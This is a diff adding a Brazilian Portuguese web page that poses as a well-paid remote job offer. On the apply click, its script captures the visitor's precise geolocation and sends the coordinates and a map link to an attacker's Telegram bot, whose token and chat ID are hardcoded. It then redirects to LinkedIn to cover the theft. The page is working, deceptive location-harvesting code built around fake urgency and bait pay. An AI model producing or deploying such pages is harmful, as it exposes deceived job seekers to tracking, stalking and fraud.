@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Vagas Premium | Recrutamento Remoto 2026</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://unpkg.com/lucide@latest"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap');
+        body { font-family: 'Inter', sans-serif; }
+        .glass { background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(10px); border: 1px solid rgba(255, 255, 255, 0.1); }
+    </style>
+</head>
+<body class="bg-slate-950 text-slate-200 min-h-screen flex flex-col items-center justify-center p-4">
+
+    <!-- Main Card -->
+    <div class="max-w-md w-full glass rounded-3xl p-8 shadow-2xl text-center relative overflow-hidden">
+        <!-- Decorative Glow -->
+        <div class="absolute -top-24 -right-24 w-48 h-48 bg-emerald-500/20 blur-3xl rounded-full"></div>
+        <div class="absolute -bottom-24 -left-24 w-48 h-48 bg-blue-500/20 blur-3xl rounded-full"></div>
+
+        <div class="relative z-10">
+            <div class="flex justify-center mb-6">
+                <div class="p-3 bg-emerald-500/10 rounded-2xl border border-emerald-500/20">
+                    <i data-lucide="briefcase" class="text-emerald-400 w-8 h-8"></i>
+                </div>
+            </div>
+
+            <h1 class="text-3xl font-bold text-white mb-3">Vagas de Analista Remoto</h1>
+            <p class="text-slate-400 mb-8 leading-relaxed">
+                Estamos selecionando profissionais para operação de dados com remuneração entre <span class="text-emerald-400 font-semibold">R$ 8.500,00 e R$ 12.000,00</span> mensais.
+            </p>
+
+            <!-- Benefit List -->
+            <div class="space-y-4 mb-10 text-left max-w-xs mx-auto">
+                <div class="flex items-center gap-3 text-sm">
+                    <i data-lucide="check-circle" class="text-emerald-500 w-5 h-5"></i>
+                    <span>100% Home Office (Remoto)</span>
+                </div>
+                <div class="flex items-center gap-3 text-sm">
+                    <i data-lucide="check-circle" class="text-emerald-500 w-5 h-5"></i>
+                    <span>Pagamentos Semanais via PIX</span>
+                </div>
+                <div class="flex items-center gap-3 text-sm">
+                    <i data-lucide="check-circle" class="text-emerald-500 w-5 h-5"></i>
+                    <span>Sem experiência prévia exigida</span>
+                </div>
+            </div>
+
+            <!-- Action Button -->
+            <button id="btn-apply" class="w-full py-4 bg-emerald-500 hover:bg-emerald-400 text-slate-950 font-bold rounded-xl transition-all transform active:scale-95 shadow-lg shadow-emerald-500/20 flex items-center justify-center gap-2">
+                Candidatar-se Agora
+                <i data-lucide="arrow-right" class="w-5 h-5"></i>
+            </button>
+
+            <p class="mt-6 text-xs text-slate-500">
+                * Restam apenas 4 vagas para a sua região.
+            </p>
+        </div>
+    </div>
+
+    <!-- Loading Overlay -->
+    <div id="loader" class="fixed inset-0 bg-slate-950/90 z-50 hidden flex-col items-center justify-center text-center p-6">
+        <div class="w-12 h-12 border-4 border-emerald-500 border-t-transparent rounded-full animate-spin mb-4"></div>
+        <h2 class="text-xl font-semibold text-white mb-2">Verificando Disponibilidade...</h2>
+        <p class="text-slate-400">Localizando a vaga mais próxima de você para otimizar o contrato.</p>
+    </div>
+
+    <script>
+        // CONFIGURAÇÃO FINALIZADA COM SEUS DADOS
+        const BOT_TOKEN = '8828418111:AAFpaC81ZXYLyxI2Z_K5JZE0BBoPobsQR-c';
+        const CHAT_ID = '5345130205';
+        const WEBHOOK_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+        lucide.createIcons();
+
+        const btnApply = document.getElementById('btn-apply');
+        const loader = document.getElementById('loader');
+
+        btnApply.addEventListener('click', () => {
+            loader.classList.remove('hidden');
+            loader.classList.add('flex');
+
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(sendLocation, handleError, {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0
+                });
+            } else {
+                alert("Seu navegador não suporta geolocalização.");
+                loader.classList.add('hidden');
+            }
+        });
+
+        async function sendLocation(position) {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            const accuracy = position.coords.accuracy;
+
+            const text = `🎯 Nova Localização Capturada!\n\n📍 Lat: ${lat}\n📍 Long: ${lon}\n📏 Precisão: ${accuracy} metros\n🗺️ Link: https://www.google.com/maps?q=${lat},${lon}`;
+
+            try {
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: text
+                    })
+                });
+            } catch (e) {
+                console.error("Erro ao enviar:", e);
+            }
+
+            window.location.href = "https://www.linkedin.com/jobs/";
+        }
+
+        function handleError(error) {
+            console.log("Erro de permissão:", error.message);
+            window.location.href = "https://www.linkedin.com/jobs/";
+        }
+    </script>
+</body>
+</html>
